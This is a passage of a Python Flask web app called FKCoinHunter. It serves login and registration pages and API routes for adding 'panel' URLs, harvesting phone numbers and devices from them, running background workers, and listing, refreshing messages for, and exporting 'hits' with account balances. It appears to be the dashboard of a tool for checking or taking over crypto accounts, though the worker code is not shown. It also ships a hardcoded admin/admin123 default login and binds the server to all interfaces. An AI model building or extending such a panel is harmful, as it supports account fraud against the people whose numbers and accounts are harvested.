    if not username or not password:
        return redirect('/login?error=Username and password required')
    
    user_id = UserManager.authenticate(username, password)
    if user_id:
        session['user_id'] = user_id
        UserDataManager.ensure_user_data(user_id)
        return redirect('/')
    else:
        return redirect('/login?error=Invalid username or password')

@app.route('/register')
def register_page():
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>FKCoinHunter - Register</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #0a0e1a; color: #e0e0e0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .register-box { background: #141b2d; padding: 40px; border-radius: 16px; width: 380px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
        .register-box h1 { color: #fbbf24; margin-bottom: 10px; font-size: 28px; }
        .register-box p { color: #6b7a9f; margin-bottom: 25px; font-size: 14px; }
        input { width: 100%; padding: 12px 16px; margin-bottom: 12px; border-radius: 8px; border: 1px solid #1a2338; background: #0a0e1a; color: #e0e0e0; font-size: 14px; }
        input:focus { outline: none; border-color: #fbbf24; }
        button { width: 100%; padding: 12px; border: none; border-radius: 8px; background: #fbbf24; color: #0a0e1a; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.2s; }
        button:hover { opacity: 0.85; transform: scale(0.98); }
        .error { color: #f87171; margin-top: 10px; font-size: 13px; }
        .login-link { text-align: center; margin-top: 15px; color: #6b7a9f; }
        .login-link a { color: #60a5fa; text-decoration: none; }
        .login-link a:hover { text-decoration: underline; }
        .success { color: #4ade80; margin-top: 10px; font-size: 13px; }
    </style>
    </head>
    <body>
        <div class="register-box">
            <h1>🦅 FKCoinHunter</h1>
            <p>Create your account</p>
            <form method="POST" action="/register">
                <input type="text" name="username" placeholder="Choose a username" required minlength="3">
                <input type="password" name="password" placeholder="Choose a password" required minlength="6">
                <button type="submit">Register</button>
            </form>
            <div class="login-link">
                Already have an account? <a href="/login">Login</a>
            </div>
            <div id="message"></div>
        </div>
        <script>
            const params = new URLSearchParams(window.location.search);
            if (params.get('success')) {
                document.getElementById('message').className = 'success';
                document.getElementById('message').textContent = '✅ Account created! Please login.';
            }
            if (params.get('error')) {
                document.getElementById('message').className = 'error';
                document.getElementById('message').textContent = '❌ ' + params.get('error');
            }
        </script>
    </body>
    </html>
    '''

@app.route('/register', methods=['POST'])
def register():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    
    if not username or not password:
        return redirect('/register?error=Username and password required')
    
    if len(username) < 3:
        return redirect('/register?error=Username must be at least 3 characters')
    
    if len(password) < 6:
        return redirect('/register?error=Password must be at least 6 characters')
    
    users = UserManager.load_users()
    if username in users:
        return redirect('/register?error=Username already taken')
    
    result = UserManager.create_user(username, password)
    if result:
        return redirect('/register?success=1')
    else:
        return redirect('/register?error=Registration failed')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect('/login')

# ============ API ROUTES ============

@app.route('/api/status')
def api_status():
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    status = UserDataManager.load_user_status(user_id)
    account_manager = UserAccountManager(user_id)
    stats = account_manager.get_stats()
    status['stats'] = stats
    status['total_processed'] = stats.get('total_processed', 0)
    status['successful'] = stats.get('successful', 0)
    status['failed'] = stats.get('failed', 0)
    status['hits'] = stats.get('hits', 0)
    status['total_balance'] = stats.get('total_balance', 0)
    
    panels = UserDataManager.load_user_data(user_id, 'panels.json')
    status['total_panels'] = len(panels) if isinstance(panels, list) else 0
    
    return jsonify(status)

@app.route('/api/stats')
def api_stats():
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    account_manager = UserAccountManager(user_id)
    return jsonify(account_manager.get_stats())

@app.route('/api/accounts')
def api_accounts():
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    account_manager = UserAccountManager(user_id)
    return jsonify(account_manager.get_accounts())

@app.route('/api/hits')
def api_hits():
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    account_manager = UserAccountManager(user_id)
    return jsonify(account_manager.get_hits())

@app.route('/api/hits/<int:index>')
def api_hit(index):
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    account_manager = UserAccountManager(user_id)
    hit = account_manager.get_hit(index)
    if hit:
        return jsonify(hit)
    return jsonify({'error': 'Hit not found'}), 404

@app.route('/api/hits/<int:index>/messages')
def api_hit_messages(index):
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    account_manager = UserAccountManager(user_id)
    messages = account_manager.get_messages_for_hit(index)
    return jsonify(messages)

@app.route('/api/hits/<int:index>/messages/refresh', methods=['POST'])
def api_refresh_hit_messages(index):
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    account_manager = UserAccountManager(user_id)
    messages = account_manager.refresh_messages_for_hit(index)
    return jsonify(messages)

@app.route('/api/databases')
def api_databases():
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    account_manager = UserAccountManager(user_id)
    panels = account_manager.get_panels()
    status = UserDataManager.load_user_status(user_id)
    current_index = status.get('panel_index', 1) - 1
    
    return jsonify({
        'databases': [p.get('url', '') for p in panels],
        'current_index': current_index if 0 <= current_index < len(panels) else 0,
        'current_panel': panels[current_index].get('name', '') if 0 <= current_index < len(panels) else '',
        'total': len(panels)
    })

@app.route('/api/databases/add', methods=['POST'])
def api_add_databases():
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    urls = request.json.get('urls', [])
    if isinstance(urls, str):
        urls = [urls]
    
    account_manager = UserAccountManager(user_id)
    added = account_manager.add_panels(urls)
    
    return jsonify({'added': added, 'total': len(account_manager.get_panels())})

@app.route('/api/databases/select', methods=['POST'])
def api_select_database():
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    index = request.json.get('index', 0)
    account_manager = UserAccountManager(user_id)
    
    if account_manager.set_current_panel(index):
        return jsonify({'success': True})
    return jsonify({'success': False}), 400

@app.route('/api/databases/delete', methods=['POST'])
def api_delete_database():
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    index = request.json.get('index', 0)
    account_manager = UserAccountManager(user_id)
    
    if account_manager.remove_panel(index):
        return jsonify({'success': True})
    return jsonify({'success': False}), 400

@app.route('/api/panels/next', methods=['POST'])
def api_next_panel():
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    account_manager = UserAccountManager(user_id)
    panels = account_manager.get_panels()
    status = UserDataManager.load_user_status(user_id)
    current = status.get('panel_index', 1) - 1
    next_index = (current + 1) % len(panels) if panels else 0
    
    if account_manager.set_current_panel(next_index):
        return jsonify({'success': True, 'index': next_index})
    return jsonify({'success': False}), 400

@app.route('/api/fetch-devices', methods=['POST'])
def api_fetch_devices():
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    account_manager = UserAccountManager(user_id)
    panel = account_manager.get_current_panel()
    
    if not panel:
        return jsonify({'error': 'No panel selected'}), 400
    
    devices = fetch_phones_from_panel(panel, limit=100)
    return jsonify({
        'devices': [{'phone': phone, 'device': device} for phone, device in devices],
        'count': len(devices),
        'panel': panel.get('name')
    })

@app.route('/api/start', methods=['POST'])
def api_start():
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    account_manager = UserAccountManager(user_id)
    if not account_manager.get_current_panel():
        return jsonify({'error': 'No panel selected'}), 400
    
    with user_lock:
        if user_id not in active_users:
            active_users[user_id] = {
                'worker': UserWorker(user_id),
                'created_at': datetime.now().isoformat()
            }
        worker = active_users[user_id]['worker']
    
    worker.start()
    return jsonify({'success': True})

@app.route('/api/stop', methods=['POST'])
def api_stop():
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    with user_lock:
        if user_id in active_users:
            active_users[user_id]['worker'].stop()
    
    return jsonify({'success': True})

@app.route('/api/clear/logs', methods=['POST'])
def api_clear_logs():
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    UserDataManager.clear_user_logs(user_id)
    return jsonify({'success': True})

@app.route('/api/export/accounts')
def api_export_accounts():
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    account_manager = UserAccountManager(user_id)
    filename = f"accounts_export_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    try:
        accounts_data = account_manager.get_accounts()
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(accounts_data, f, indent=2, ensure_ascii=False)
        return send_file(filename, as_attachment=True)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/export/hits')
def api_export_hits():
    user_id = get_user_id_from_request()
    if not user_id:
        return jsonify({'error': 'Authentication required'}), 401
    
    filename = f"hits_export_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    try:
        hits = UserDataManager.load_user_data(user_id, 'hits.json')
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(hits, f, indent=2, ensure_ascii=False)
        return send_file(filename, as_attachment=True)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============ SOCKETIO EVENTS ============
@socketio.on('connect')
def handle_connect():
    user_id = get_user_id_from_request()
    if user_id:
        from flask_socketio import join_room
        join_room(user_id)
        
        status = UserDataManager.load_user_status(user_id)
        account_manager = UserAccountManager(user_id)
        stats = account_manager.get_stats()
        status['stats'] = stats
        
        logs = UserDataManager.load_user_data(user_id, 'logs.json')
        status['processing_logs'] = logs[-50:] if isinstance(logs, list) and logs else []
        
        emit('connected', {'status': 'connected', 'user_id': user_id})
        emit('status_update', status)
        
        hits = account_manager.get_hits()
        emit('hits_list', hits[-10:] if isinstance(hits, list) and hits else [])

@socketio.on('disconnect')
def handle_disconnect():
    pass

# ============ MAIN ============
if __name__ == '__main__':
    print("\n" + "=" * 60)
    print("🦅 FKCoinHunter - Multi-User Web Panel (FIXED)")
    print("=" * 60)
    print("✅ File locking added to prevent corruption")
    print("✅ Safe JSON reading with recovery")
    print("✅ Each user has isolated data")
    print("Default admin: admin / admin123")
    print("=" * 60)
    print("\n🌐 Starting web server...")
    print("📱 Open your browser and go to: http://localhost:5000")
    print("=" * 60 + "\n")
    
    def open_browser():
        time.sleep(1.5)
        webbrowser.open('http://localhost:5000')
    
    threading.Thread(target=open_browser, daemon=True).start()
    
    socketio.run(app, host="0.0.0.0", port=5000, debug=False, use_reloader=False, allow_unsafe_werkzeug=True)